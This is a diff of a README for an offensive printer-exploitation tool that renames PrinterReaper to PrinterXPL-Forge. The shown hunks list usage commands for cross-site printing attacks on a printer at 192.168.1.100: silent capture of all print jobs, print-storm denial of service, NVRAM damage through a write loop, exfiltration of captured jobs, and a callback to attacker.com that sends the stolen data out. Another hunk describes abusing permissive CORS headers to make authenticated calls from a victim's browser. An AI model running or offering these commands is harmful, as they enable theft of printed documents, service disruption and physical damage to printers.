@@ -20,25 +20,25 @@ This technique bypasses all network-level firewalls that allow outbound HTTP, an
 
 ```bash
 # Information disclosure — extract printer ID, firmware, serial
-python printer-reaper.py 192.168.1.100 --xsp info
+python printerxpl-forge.py 192.168.1.100 --xsp info
 
 # Job capture — silently capture all print jobs going forward
-python printer-reaper.py 192.168.1.100 --xsp capture
+python printerxpl-forge.py 192.168.1.100 --xsp capture
 
 # DoS — print storm (resource exhaustion)
-python printer-reaper.py 192.168.1.100 --xsp dos
+python printerxpl-forge.py 192.168.1.100 --xsp dos
 
 # NVRAM damage (physical wear via write loop)
-python printer-reaper.py 192.168.1.100 --xsp nvram
+python printerxpl-forge.py 192.168.1.100 --xsp nvram
 
 # Retrieve previously captured jobs
-python printer-reaper.py 192.168.1.100 --xsp exfil
+python printerxpl-forge.py 192.168.1.100 --xsp exfil
 
 # With callback URL for automatic data exfiltration
-python printer-reaper.py 192.168.1.100 --xsp capture \
+python printerxpl-forge.py 192.168.1.100 --xsp capture \
   --xsp-callback https://attacker.com/recv
 
-python printer-reaper.py 192.168.1.100 --xsp info \
+python printerxpl-forge.py 192.168.1.100 --xsp info \
   --xsp-callback https://attacker.com/recv
 ```
 
@@ -118,7 +118,7 @@ Generated payloads are saved to `.log/xsp_<type>.html`. Deploy them via:
 
 ## CORS Spoofing
 
-Some printer EWS interfaces respond to cross-origin requests with overly permissive CORS headers (`Access-Control-Allow-Origin: *`). PrinterReaper's XSP module exploits this to make authenticated API calls from the victim's browser to the printer's web interface:
+Some printer EWS interfaces respond to cross-origin requests with overly permissive CORS headers (`Access-Control-Allow-Origin: *`). PrinterXPL-Forge's XSP module exploits this to make authenticated API calls from the victim's browser to the printer's web interface:
 
 ```javascript
 // Printer responds with: Access-Control-Allow-Origin: *
